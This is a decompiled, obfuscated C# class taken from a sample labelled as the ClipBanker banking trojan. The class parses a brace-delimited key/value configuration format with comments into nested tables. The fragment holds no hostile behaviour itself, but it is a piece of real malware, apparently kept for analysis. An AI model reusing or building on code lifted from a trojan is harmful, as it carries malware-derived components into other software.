// Decompiled with JetBrains decompiler
// Type: BMB.843
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0036e5;
using \u0037az;
using No9;
using o3x;
using QP8;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using U81;
using Vo9;

namespace BMB
{
  public sealed class \u003843
  {
    private string \u0032f7;
    private \u003843.yyz YH7;
    private bool kpe = false;

    public \u003843([In] string obj0) => this.\u0032f7 = obj0;

    private \u003843.\u0036m9 m62([In] char obj0)
    {
      switch (obj0)
      {
        case '\t':
        case '\r':
        case ' ':
          return \u003843.\u0036m9.\u0023a;
        case '\n':
          return \u003843.\u0036m9.\u0023b;
        case '"':
          return \u003843.\u0036m9.\u0023c;
        case '/':
          return \u003843.\u0036m9.\u0023d;
        case '\\':
          return \u003843.\u0036m9.\u0023g;
        case '{':
          return \u003843.\u0036m9.\u0023e;
        case '}':
          return \u003843.\u0036m9.\u0023f;
        default:
          return \u003843.\u0036m9.\u0023h;
      }
    }

    private char G2N([In] char obj0)
    {
      switch (obj0)
      {
        case 'n':
          return '\n';
        case 't':
          return '\t';
        default:
          return obj0;
      }
    }

    private string \u0038r7(string _param1, int _param2, out int _param3, out bool _param4)
    {
      _param4 = true;
      bool flag1 = false;
      bool flag2 = this.m62(_param1[_param2]) == \u003843.\u0036m9.\u0023c;
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = _param2; index < _param1.Length; ++index)
      {
        switch (this.m62(_param1[index]))
        {
          case \u003843.\u0036m9.\u0023a:
            if (flag2)
            {
              stringBuilder.Append(_param1[index]);
              break;
            }
            _param3 = index;
            return stringBuilder.ToString();
          case \u003843.\u0036m9.\u0023c:
            if (!flag1 & flag2 && index > _param2)
            {
              _param3 = index + 1;
              return stringBuilder.ToString();
            }
            if (!flag2)
              throw new Vm2("Non-Escape sequences cannot contain sequence delimiters", _param1[index]);
            if (flag1)
            {
              stringBuilder.Append(this.G2N(_param1[index]));
              flag1 = false;
              break;
            }
            break;
          case \u003843.\u0036m9.\u0023g:
            if (flag1)
              stringBuilder.Append(this.G2N(_param1[index]));
            flag1 = !flag1;
            break;
          default:
            if (flag1)
            {
              stringBuilder.Append(this.G2N(_param1[index]));
              flag1 = false;
              break;
            }
            stringBuilder.Append(_param1[index]);
            break;
        }
      }
      _param3 = _param1.Length;
      if (flag2)
      {
        if (this.m62(_param1[_param1.Length - 1]) != \u003843.\u0036m9.\u0023c)
        {
          _param4 = false;
        }
        else
        {
          int num = 0;
          for (int index = _param1.Length - 2; index >= 0 && this.m62(_param1[index]) == \u003843.\u0036m9.\u0023g; --index)
            ++num;
          _param4 = num % 2 == 0;
        }
      }
      return stringBuilder.ToString();
    }

    private void tK8([In] Action<\u003843.yyz> obj0, [In] string obj1)
    {
      int startIndex;
      bool flag;
      string str = this.\u0038r7("\"" + obj1, 0, out startIndex, out flag);
      if (!flag)
      {
        // ISSUE: explicit reference operation
        ^ref this.YH7.m3e += str;
        this.kpe = true;
      }
      else
      {
        this.kpe = false;
        obj0(this.YH7);
        if (startIndex < obj1.Length)
          this.SiC(obj0, obj1.Substring(startIndex).Trim());
      }
    }

    private void SiC([In] Action<\u003843.yyz> obj0, [In] string obj1)
    {
      if (string.IsNullOrEmpty(obj1))
        return;
      switch (this.m62(obj1[0]))
      {
        case \u003843.\u0036m9.\u0023d:
          if (obj1.Length < 2 || this.m62(obj1[1]) != \u003843.\u0036m9.\u0023d)
            throw new Vm2("Single comment delimiter is not allowed", obj1[0]);
          obj0(new \u003843.yyz()
          {
            I24 = \u003843.d3o.\u0023d,
            m3e = obj1
          });
          break;
        case \u003843.\u0036m9.\u0023e:
          obj0(new \u003843.yyz()
          {
            I24 = \u003843.d3o.\u0023b,
            m3e = obj1[0].ToString()
          });
          break;
        case \u003843.\u0036m9.\u0023f:
          obj0(new \u003843.yyz()
          {
            I24 = \u003843.d3o.\u0023c,
            m3e = obj1[0].ToString()
          });
          break;
        default:
          int startIndex;
          bool flag;
          string str = this.\u0038r7(obj1, 0, out startIndex, out flag);
          if (!flag)
          {
            this.YH7 = new \u003843.yyz()
            {
              I24 = \u003843.d3o.\u0023a,
              m3e = str
            };
            this.kpe = true;
            break;
          }
          obj0(new \u003843.yyz()
          {
            I24 = \u003843.d3o.\u0023a,
            m3e = str
          });
          if (startIndex < obj1.Length)
            this.SiC(obj0, obj1.Substring(startIndex).Trim());
          break;
      }
    }

    private List<\u003843.yyz> \u00332F([In] string obj0)
    {
      List<\u003843.yyz> yyzList = new List<\u003843.yyz>();
      foreach (string str in ((IEnumerable<string>) obj0.Split('\n')).Select<string, string>(\u003843.NNF.\u003C\u003E9__13_0 ?? (\u003843.NNF.\u003C\u003E9__13_0 = new Func<string, string>(\u003843.NNF.\u003C\u003E9.Jno))))
      {
        if (this.kpe)
          this.tK8(new Action<\u003843.yyz>(yyzList.Add), str);
        else
          this.SiC(new Action<\u003843.yyz>(yyzList.Add), str);
      }
      return yyzList;
    }

    public \u0039U7 \u0038zf()
    {
      if (this.\u0032f7 == null)
        throw new ArgumentNullException("s");
      List<\u003843.yyz> yyzList = this.\u0032f7.Length >= 1 ? this.\u00332F(this.\u0032f7) : throw new ArgumentException("s cannot be empty ", "s");
      if (yyzList.Count < 1)
        throw new ArgumentException("no tokens found in string", "s");
      \u0039U7 obj1 = (\u0039U7) null;
      cd2 cd2 = (cd2) null;
      List<string> stringList = new List<string>();
      string str1 = (string) null;
      foreach (\u003843.yyz yyz in yyzList)
      {
        if (yyz.I24 == \u003843.d3o.\u0023d)
          stringList.Add(yyz.m3e.Substring(2));
        else if (obj1 == null)
        {
          if (yyz.I24 == \u003843.d3o.\u0023a)
          {
            if (str1 != null)
              return (\u0039U7) new \u0033nw(str1, yyz.m3e);
            str1 = yyz.m3e;
          }
          else
          {
            if (yyz.I24 != \u003843.d3o.\u0023b)
              throw new CNi("Invalid format: First token was not a string");
            obj1 = (\u0039U7) new cd2(str1);
            if (stringList.Count > 0)
            {
              foreach (string str2 in stringList)
                obj1.J27().Add(str2);
              stringList.Clear();
            }
            cd2 = obj1 as cd2;
            str1 = (string) null;
          }
        }
        else if (str1 != null)
        {
          if (yyz.I24 == \u003843.d3o.\u0023a)
          {
            int result1;
            double result2;
            \u0039U7 obj2 = !int.TryParse(yyz.m3e, NumberStyles.Integer, (IFormatProvider) CultureInfo.InvariantCulture, out result1) ? (!double.TryParse(yyz.m3e, NumberStyles.Number, (IFormatProvider) CultureInfo.InvariantCulture, out result2) ? (\u0039U7) new \u0033nw(str1, yyz.m3e) : (\u0039U7) new Oi8(str1, result2)) : (\u0039U7) new \u0032H1(str1, result1);
            if (stringList.Count > 0)
            {
              foreach (string str3 in stringList)
                obj2.J27().Add(str3);
              stringList.Clear();
            }
            str1 = (string) null;
            cd2.Add(obj2);
          }
          else if (yyz.I24 == \u003843.d3o.\u0023b)
          {
            \u0039U7 obj3 = (\u0039U7) new cd2(str1);
            if (stringList.Count > 0)
            {
              foreach (string str4 in stringList)
                obj3.J27().Add(str4);
              stringList.Clear();
            }
            cd2.Add(obj3);
            str1 = (string) null;
            cd2 = obj3 as cd2;
          }
        }
        else if (yyz.I24 == \u003843.d3o.\u0023a)
        {
          str1 = yyz.m3e;
        }
        else
        {
          if (yyz.I24 != \u003843.d3o.\u0023c)
            throw new CNi("Invalid Format: a name was needed but not found");
          cd2 = cd2.MX7() as cd2;
        }
      }
      if (cd2 != null)
        throw new CNi("Invalid format: unclosed table");
      return obj1;
    }

    private enum d3o
    {
      \u0023a,
      \u0023b,
      \u0023c,
      \u0023d,
      \u0023e,
    }

    private struct yyz
    {
      public \u003843.d3o I24;
      public string m3e;
    }

    private enum \u0036m9
    {
      \u0023a,
      \u0023b,
      \u0023c,
      \u0023d,
      \u0023e,
      \u0023f,
      \u0023g,
      \u0023h,
    }

    [Serializable]
    private sealed class NNF
    {
      public static readonly \u003843.NNF \u003C\u003E9 = new \u003843.NNF();
      public static Func<string, string> \u003C\u003E9__13_0;

      internal string Jno([In] string obj0) => obj0.Trim();
    }
  }
}
